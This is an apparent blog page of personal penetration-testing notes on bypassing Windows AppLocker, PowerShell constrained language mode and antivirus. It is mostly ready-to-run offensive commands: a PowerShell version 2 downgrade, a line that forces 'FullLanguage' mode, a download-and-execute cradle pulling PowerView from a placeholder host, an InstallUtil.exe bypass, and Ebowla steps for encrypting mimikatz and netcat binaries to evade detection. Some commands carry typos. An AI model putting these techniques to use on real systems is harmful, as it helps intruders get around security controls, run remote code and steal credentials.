+++

title = "Windows-Bypass"

+++

I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions.

If PowerShell version 2 is available you may be able to use this trick.  

```
PowerShell -Version 2 -ExecutionPolicy ByPass -command ""
```

to check for constrained language mode. 

```
$ExecutionContext.SessionState.LanguageMode
```

```
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
```

```
ie (New-Object Net.WebClient).DownloadString('http://changeme/powerview.ps1')
```

```
[System.Console]::WriteLine("Hello")
```

```
c:\windows\microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U .\meh.exe
```

Bypassing anti virus 

Using, Ebowla to bypass detection, why because anti virus looks for matching code to detect malicious software. You can use encryptions and decoding to evade detection. This for me is a last resort ill spend awhile trying to bypass restrictions. I may upload binaries. 

genetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computer name as the target

trying to get a payload to work was touchy my objective now is to encode Binary using Ebowla. I typically try to bring both copies a x86 and x64 binaries. 

note: locate mimi*.exe find the x64 version then copy it into Ebowla

```
python ebowla.py binary.exe genetic.config
```

```
./build_x64_go.sh output/go_symmetric_binary_x64.exe.gp bianry.exe
```

![nc-ebowla](https://chickenpwny.github.io/images/bypass/nc-ebowla.PNG)

